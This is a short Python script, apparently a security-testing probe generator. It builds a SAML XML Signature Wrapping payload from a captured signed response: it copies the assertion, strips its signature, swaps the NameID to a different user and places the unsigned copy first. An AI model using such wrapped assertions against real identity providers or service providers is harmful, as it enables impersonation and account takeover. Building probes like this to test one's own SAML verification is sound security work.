# Wrapping generator: lxml, captured signed response in saml-response.xml; writes test XML only
from copy import deepcopy
from lxml import etree
saml_parser = etree.XMLParser(resolve_entities=False, no_network=True)
saml_tree = etree.parse('saml-response.xml', saml_parser)
saml_root = saml_tree.getroot()
saml_ns = {'saml': 'urn:oasis:names:tc:SAML:2.0:assertion', 'ds': 'http://www.w3.org/2000/09/xmldsig#'}
saml_signed = saml_root.find('saml:Assertion', saml_ns)
saml_unsigned = deepcopy(saml_signed)
for saml_signature in saml_unsigned.findall('ds:Signature', saml_ns):
    saml_unsigned.remove(saml_signature)
saml_unsigned.set('ID', '_saml_unsigned_wrapped')
saml_unsigned.find('saml:Subject/saml:NameID', saml_ns).text = 'saml-user-b@example.test'
saml_root.insert(0, saml_unsigned)
saml_tree.write('saml-wrapping-probe.xml', encoding='UTF-8', xml_declaration=True)
